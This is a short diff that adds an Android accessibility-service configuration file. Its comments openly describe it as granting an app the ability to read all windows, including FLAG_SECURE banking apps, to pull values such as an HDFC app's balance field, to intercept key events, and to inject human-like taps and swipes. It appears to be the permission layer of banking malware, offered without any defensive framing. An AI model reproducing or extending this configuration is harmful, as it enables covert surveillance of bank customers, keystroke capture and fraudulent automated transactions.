@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeAllMask"
+    android:accessibilityFeedbackType="feedbackAllMask"
+    android:accessibilityFlags="flagRetrieveInteractiveWindows|flagReportViewIds|flagRequestFilterKeyEvents|flagRequestEnhancedWebAccessibility"
+    android:canRetrieveWindowContent="true"
+    android:canRequestFilterKeyEvents="true"
+    android:canPerformGestures="true"
+    android:description="@string/accessibility_description"
+    android:notificationTimeout="100"
+    android:settingsActivity=".ui.SettingsActivity" />
+
+<!--
+    flagRetrieveInteractiveWindows: See ALL windows including FLAG_SECURE banking apps
+    flagReportViewIds: Get resource IDs like com.hdfc.mobile:id/balance_amount
+    flagRequestEnhancedWebAccessibility: Read web content inside apps
+    canRetrieveWindowContent: Read full text from all apps
+    canPerformGestures: Inject human-like tap/swipe gestures
+    canRequestFilterKeyEvents: Intercept key events
+-->
